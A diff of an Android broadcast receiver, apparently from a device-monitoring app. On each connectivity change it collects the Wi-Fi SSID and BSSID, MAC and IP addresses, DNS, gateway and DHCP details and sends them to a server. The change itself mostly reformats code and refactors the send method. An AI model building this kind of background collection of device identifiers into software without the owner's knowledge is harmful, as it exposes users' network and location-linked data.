@@ -6,7 +6,9 @@ import java.io.File;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
 import java.util.Collections;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Map;
 
 import org.apache.http.conn.util.InetAddressUtils;
 
@@ -27,6 +29,7 @@ import android.util.Log;
 
 import com.inet.android.certificate.R;
 import com.inet.android.db.OperationWithRecordInDataBase;
+import com.inet.android.request.AppConstants;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
@@ -42,8 +45,7 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 	Resources path;
 	Context mContext;
 	private static String lastEvent = "";
-	public static final String LOG_TAG = NetworkChangeReceiver.class
-			.getSimpleName().toString();
+	public static final String LOG_TAG = NetworkChangeReceiver.class.getSimpleName().toString();
 
 	@Override
 	public void onReceive(final Context mContext, final Intent intent) {
@@ -56,15 +58,12 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 			// ConnectivityManager conMan = (ConnectivityManager) mContext
 			// .getSystemService(Context.CONNECTIVITY_SERVICE);
 			// NetworkInfo info = conMan.getActiveNetworkInfo();
-			NetworkInfo info = intent
-					.getParcelableExtra(ConnectivityManager.EXTRA_NETWORK_INFO);
+			NetworkInfo info = intent.getParcelableExtra(ConnectivityManager.EXTRA_NETWORK_INFO);
 
 			if (info != null) {
-				Logging.doLog(LOG_TAG,
-						info.getState().toString() + " " + info.getType(), info
-								.getState().toString() + " " + info.getType());
-				if (NetworkInfo.State.CONNECTED == info.getState()
-						&& !lastEvent.equals(ConvertDate.logTime())) {
+				Logging.doLog(LOG_TAG, info.getState().toString() + " " + info.getType(),
+						info.getState().toString() + " " + info.getType());
+				if (NetworkInfo.State.CONNECTED == info.getState() && !lastEvent.equals(ConvertDate.logTime())) {
 					lastEvent = ConvertDate.logTime();
 					if (info.getType() == ConnectivityManager.TYPE_WIFI) {
 						if (info.isConnected())
@@ -74,33 +73,24 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 							|| info.getType() == ConnectivityManager.TYPE_MOBILE_HIPRI
 							|| info.getType() == ConnectivityManager.TYPE_MOBILE_MMS
 							|| info.getType() == ConnectivityManager.TYPE_MOBILE_SUPL) {
-						sendStr += path.getString(R.string.connect_type) + ": "
-								+ info.getTypeName() + "\n" + " "
-								+ getMobileInfo(info.getSubtype()) + "\n"
-								+ path.getString(R.string.state) + ": "
-								+ info.getState() + "\n"
-								+ path.getString(R.string.detailed_state)
-								+ ": " + info.getDetailedState().name() + "\n"
-								+ "Info: " + info.getExtraInfo() + "\n"
+						sendStr += path.getString(R.string.connect_type) + ": " + info.getTypeName() + "\n" + " "
+								+ getMobileInfo(info.getSubtype()) + "\n" + path.getString(R.string.state) + ": "
+								+ info.getState() + "\n" + path.getString(R.string.detailed_state) + ": "
+								+ info.getDetailedState().name() + "\n" + "Info: " + info.getExtraInfo() + "\n"
 								+ "IP address: " + GetLocalIpAddress();
-						sendCreateService(sendStr);
+						sendRequest(sendStr);
 					} else {
 
-						sendStr += path.getString(R.string.connect_type) + ": "
-								+ info.getTypeName() + "\n"
-								+ path.getString(R.string.subtype_name) + ": "
-								+ info.getSubtypeName() + "\n"
-								+ path.getString(R.string.state) + ": "
-								+ info.getState() + "\n" + "Info: "
+						sendStr += path.getString(R.string.connect_type) + ": " + info.getTypeName() + "\n"
+								+ path.getString(R.string.subtype_name) + ": " + info.getSubtypeName() + "\n"
+								+ path.getString(R.string.state) + ": " + info.getState() + "\n" + "Info: "
 								+ info.getExtraInfo() + "\n";
-						sendCreateService(sendStr);
+						sendRequest(sendStr);
 					}
 					OperationWithRecordInDataBase.sendRecord(mContext);
 
 				} else if (NetworkInfo.State.DISCONNECTING == info.getState()) {
-					Logging.doLog(LOG_TAG,
-							"State.DISCONNECTING or retry event",
-							"State.DISCONNECTING");
+					Logging.doLog(LOG_TAG, "State.DISCONNECTING or retry event", "State.DISCONNECTING");
 				}
 
 			}
@@ -111,21 +101,19 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 
 	public void setNetworkAvailable(boolean network) {
 		this.network = network;
-		SharedPreferences sp = PreferenceManager
-				.getDefaultSharedPreferences(mContext);
+		SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(mContext);
 		Editor ed = sp.edit();
 		ed.putBoolean("nework_available", network);
 		ed.commit();
-		Logging.doLog(LOG_TAG, "network" + Boolean.toString(network), "network"
-				+ Boolean.toString(network));
+		Logging.doLog(LOG_TAG, "network" + Boolean.toString(network), "network" + Boolean.toString(network));
 	}
 
 	static public int isOnline(Context context) {
 		final ConnectivityManager connMgr = (ConnectivityManager) context
 				.getSystemService(Context.CONNECTIVITY_SERVICE);
-	
+
 		NetworkInfo netInfo = connMgr.getActiveNetworkInfo();
-		if (netInfo != null && netInfo.isConnected() && netInfo.isAvailable()){
+		if (netInfo != null && netInfo.isConnected() && netInfo.isAvailable()) {
 			Logging.doLog(LOG_TAG, "isOnline connMgr", "isOnline connMgr");
 
 			if (netInfo.getType() == ConnectivityManager.TYPE_WIFI)
@@ -140,11 +128,9 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 	private String GetLocalIpAddress() {
 		try {
 			Boolean useIPv4 = true;
-			List<NetworkInterface> interfaces = Collections
-					.list(NetworkInterface.getNetworkInterfaces());
+			List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
 			for (NetworkInterface intf : interfaces) {
-				List<InetAddress> addrs = Collections.list(intf
-						.getInetAddresses());
+				List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
 				for (InetAddress addr : addrs) {
 					if (!addr.isLoopbackAddress()) {
 						String sAddr = addr.getHostAddress().toUpperCase();
@@ -156,8 +142,7 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 							if (!isIPv4) {
 								int delim = sAddr.indexOf('%'); // drop ip6 port
 																// suffix
-								return delim < 0 ? sAddr : sAddr.substring(0,
-										delim);
+								return delim < 0 ? sAddr : sAddr.substring(0, delim);
 							}
 						}
 					}
@@ -170,8 +155,8 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 
 	private void getWifiState(NetworkInfo info) {
 
-		WifiManager myWifiManager = (WifiManager) mContext
-				.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+		WifiManager myWifiManager = (WifiManager) mContext.getApplicationContext()
+				.getSystemService(Context.WIFI_SERVICE);
 		WifiInfo myWifiInfo = myWifiManager.getConnectionInfo();
 
 		Log.d(LOG_TAG, myWifiInfo.getMacAddress());
@@ -180,50 +165,39 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 
 			Log.d(LOG_TAG, "--- CONNECTED ---");
 
-			WifiManager wifii = (WifiManager) mContext.getApplicationContext()
-					.getSystemService(Context.WIFI_SERVICE);
+			WifiManager wifii = (WifiManager) mContext.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
 			DhcpInfo dhcp = wifii.getDhcpInfo();
 
 			String dns1 = "DNS 1: " + intToIpAddress(dhcp.dns1) + "\n";
 			String dns2 = "DNS 2: " + intToIpAddress(dhcp.dns2) + "\n";
-			String gateway = path.getString(R.string.gateway)
-					+ intToIpAddress(dhcp.gateway) + "\n";
+			String gateway = path.getString(R.string.gateway) + intToIpAddress(dhcp.gateway) + "\n";
 
-			String ipAddress = "IP Address: " + intToIpAddress(dhcp.ipAddress)
-					+ "\n";
-			String leaseDuration = "Lease Time: "
-					+ String.valueOf(dhcp.leaseDuration) + "\n";
-			String netmask = "Subnet Mask: " + intToIpAddress(dhcp.netmask)
-					+ "\n";
-			String serverAddress = "Server IP: "
-					+ intToIpAddress(dhcp.serverAddress) + "\n";
+			String ipAddress = "IP Address: " + intToIpAddress(dhcp.ipAddress) + "\n";
+			String leaseDuration = "Lease Time: " + String.valueOf(dhcp.leaseDuration) + "\n";
+			String netmask = "Subnet Mask: " + intToIpAddress(dhcp.netmask) + "\n";
+			String serverAddress = "Server IP: " + intToIpAddress(dhcp.serverAddress) + "\n";
 
-			sendStr += path.getString(R.string.connect_type) + ": "
-					+ info.getTypeName() + "\n"
-					+ path.getString(R.string.state) + ": " + info.getState()
-					+ "\n" + path.getString(R.string.name_wifi_network) + ": "
-					+ myWifiInfo.getSSID() + "\n"
-					+ path.getString(R.string.mac_address_point) + ": "
-					+ myWifiInfo.getBSSID() + "\n"
-					+ path.getString(R.string.speed) + ": "
-					+ String.valueOf(myWifiInfo.getLinkSpeed()) + " "
-					+ WifiInfo.LINK_SPEED_UNITS + "\n" + "RSRP: "
-					+ String.valueOf(myWifiInfo.getRssi()) + " dBm" + "\n"
-					+ ipAddress + " " + netmask + " " + serverAddress + " "
-					+ dns1 + " " + dns2 + " " + gateway + " " + leaseDuration;
-		
+			sendStr += path.getString(R.string.connect_type) + ": " + info.getTypeName() + "\n"
+					+ path.getString(R.string.state) + ": " + info.getState() + "\n"
+					+ path.getString(R.string.name_wifi_network) + ": " + myWifiInfo.getSSID() + "\n"
+					+ path.getString(R.string.mac_address_point) + ": " + myWifiInfo.getBSSID() + "\n"
+					+ path.getString(R.string.speed) + ": " + String.valueOf(myWifiInfo.getLinkSpeed()) + " "
+					+ WifiInfo.LINK_SPEED_UNITS + "\n" + "RSRP: " + String.valueOf(myWifiInfo.getRssi()) + " dBm" + "\n"
+					+ ipAddress + " " + netmask + " " + serverAddress + " " + dns1 + " " + dns2 + " " + gateway + " "
+					+ leaseDuration;
+
 		} else {
 			Log.d(LOG_TAG, "--- DIS-CONNECTED! ---");
 			Log.d(LOG_TAG, "---");
 			sendStr = path.getString(R.string.disconnected_wifi);
 		}
-		sendCreateService(sendStr);
+		sendRequest(sendStr);
 
 	}
 
 	private String intToIpAddress(int ipAddress) {
-		return ((ipAddress & 0xFF) + "." + ((ipAddress >>>= 8) & 0xFF) + "."
-				+ ((ipAddress >>>= 8) & 0xFF) + "." + ((ipAddress >>>= 8) & 0xFF));
+		return ((ipAddress & 0xFF) + "." + ((ipAddress >>>= 8) & 0xFF) + "." + ((ipAddress >>>= 8) & 0xFF) + "."
+				+ ((ipAddress >>>= 8) & 0xFF));
 	}
 
 	private String getMobileInfo(int subType) {
@@ -248,10 +222,10 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 			return "NETWORK_TYPE_HSUPA ~ 1-23 Mbps"; // ~ 1-23 Mbps
 		case TelephonyManager.NETWORK_TYPE_UMTS:
 			return "NETWORK_TYPE_UMTS ~ 400-7000 kbps"; // ~ 400-7000 kbps
-			/*
-			 * Above API level 7, make sure to set android:targetSdkVersion to
-			 * appropriate level to use these
-			 */
+		/*
+		 * Above API level 7, make sure to set android:targetSdkVersion to
+		 * appropriate level to use these
+		 */
 		case TelephonyManager.NETWORK_TYPE_EHRPD: // API level 11
 			return "NETWORK_TYPE_EHRPD ~ 1-2 Mbps"; // ~ 1-2 Mbps
 		case TelephonyManager.NETWORK_TYPE_EVDO_B: // API level 9
@@ -262,7 +236,7 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 			return "NETWORK_TYPE_IDEN ~25 kbps"; // ~25 kbps
 		case TelephonyManager.NETWORK_TYPE_LTE: // API level 11
 			return "NETWORK_TYPE_LTE ~ 10+ Mbps"; // ~ 10+ Mbps
-			// Unknown
+		// Unknown
 		case TelephonyManager.NETWORK_TYPE_UNKNOWN:
 			return "NETWORK_TYPE_UNKNOWN";
 		default:
@@ -270,8 +244,15 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
 		}
 	}
 
-	private void sendCreateService(String sendStr) {
-		RequestList.sendDataRequest(path.getString(R.string.network), sendStr,
-				mContext);
+	private void sendRequest(String sendStr) {
+		Map<String, Object> network = new HashMap<String, Object>();
+		Map<String, String> info = new HashMap<String, String>();
+		network.put("type", AppConstants.TYPE_SERVICE_REQUEST);
+		network.put("time", ConvertDate.logTime());
+		info.put("area", path.getString(R.string.network));
+		info.put("event", sendStr);
+		network.put("info", info);
+
+		RequestList.sendDataRequest(network,  null,mContext);
 	}
 }
